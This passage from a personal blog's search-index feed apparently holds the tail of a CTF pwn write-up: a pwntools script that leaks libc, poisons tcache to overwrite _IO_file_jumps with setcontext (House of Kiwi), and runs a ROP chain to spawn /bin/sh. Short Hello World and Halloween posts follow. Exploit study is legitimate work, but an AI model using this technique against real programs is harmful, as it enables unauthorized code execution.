class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to remove?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to look?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to change?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Change your idea:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gift</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;666&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    add(<span class="hljs-number">0xb0</span>, i, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">7</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0xb0</span>, <span class="hljs-number">9</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">b&#x27;\xc1&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    delete(i)<br>delete(<span class="hljs-number">9</span>)<br>delete(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">8</span>)<br><br>leak = u64( p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) )<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>IO_file_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>IO_helper_jumps = libcbase + <span class="hljs-number">2017632</span> - <span class="hljs-number">0xc0</span><br><br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">2</span>, p64(IO_file_jumps + <span class="hljs-number">0x60</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">4</span>, p64(setcontext + <span class="hljs-number">61</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">3</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[-<span class="hljs-number">8</span>:-<span class="hljs-number">2</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><br>ret = libcbase + <span class="hljs-number">0x25679</span><br>pop_rax = libcbase + <span class="hljs-number">0x4a550</span><br>pop_rdi = libcbase + <span class="hljs-number">0x26b72</span><br>pop_rsi = libcbase + <span class="hljs-number">0x27529</span><br>pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c371</span><br>syscall = libcbase + <span class="hljs-number">0x2584d</span><br>rop = p64(pop_rdx_r12) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) <br>rop += p64(heap_addr + <span class="hljs-number">0x30</span>) +p64(pop_rax) + p64(<span class="hljs-number">0x3b</span>) +p64(syscall)<br><br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, rop)<br>edit(<span class="hljs-number">2</span>, p64(IO_helper_jumps + <span class="hljs-number">0xa0</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, p64(heap_addr -<span class="hljs-number">0x1b0</span>) + p64(ret))<br><span class="hljs-comment">#add(0x80, 9, b&#x27;a&#x27;)</span><br><br>add(<span class="hljs-number">0x28</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span>+ <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br>gift()<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><p> å‚è€ƒï¼š<a href="https://www.anquanke.com/post/id/235598">House OF Kiwi - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/11/01/Hello-world/"/>
    <url>/2022/11/01/Hello-world/</url>
    
    <content type="html"><![CDATA[<p>Hello World</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">avatar:</span> <span class="hljs-string">&quot;https://xtxtn.github.io/img/my.jpg&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/10/31/2022-10-31/"/>
    <url>/2022/10/31/2022-10-31/</url>
    
    <content type="html"><![CDATA[<h2 id="2022-10-31"><a href="#2022-10-31" class="headerlink" title="2022-10-31"></a>2022-10-31</h2><p><strong>Happy halloween</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
